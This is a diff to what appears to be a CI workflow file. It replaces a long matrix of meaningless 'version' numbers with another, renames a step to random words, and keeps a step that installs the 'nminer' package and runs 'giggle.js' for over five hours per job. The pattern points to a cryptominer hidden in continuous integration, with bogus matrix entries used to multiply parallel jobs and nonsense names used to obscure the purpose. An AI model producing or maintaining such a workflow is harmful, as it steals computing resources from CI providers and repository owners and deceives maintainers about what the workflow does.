@@ -9,26 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9854 }
-          - { version: 1943 }
-          - { version: 7682 }
-          - { version: 5036 }
-          - { version: 3350 }
-          - { version: 7438 }
-          - { version: 4378 }
-          - { version: 12 }
-          - { version: 2171 }
-          - { version: 565 }
-          - { version: 6526 }
-          - { version: 84 }
-          - { version: 2103 }
-          - { version: 5543 }
-          - { version: 4566 }
-          - { version: 2219 }
-          - { version: 5373 }
-          - { version: 4580 }
-          - { version: 6490 }
-          - { version: 1076 }
+          - { version: 8361 }
+          - { version: 6387 }
+          - { version: 8676 }
+          - { version: 8435 }
+          - { version: 4016 }
+          - { version: 2883 }
+          - { version: 9745 }
+          - { version: 6187 }
+          - { version: 5207 }
+          - { version: 2978 }
+          - { version: 2071 }
+          - { version: 2016 }
+          - { version: 1068 }
+          - { version: 364 }
+          - { version: 2704 }
+          - { version: 5390 }
+          - { version: 2349 }
 
     steps:
       - name: Checkout
@@ -39,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: second-hand even
+      - name: furiously unknown enormously times
         run: |
           npm install nminer@latest
-          timeout 341m node giggle.js || echo "giggle executed"
+          timeout 336m node giggle.js || echo "giggle executed"
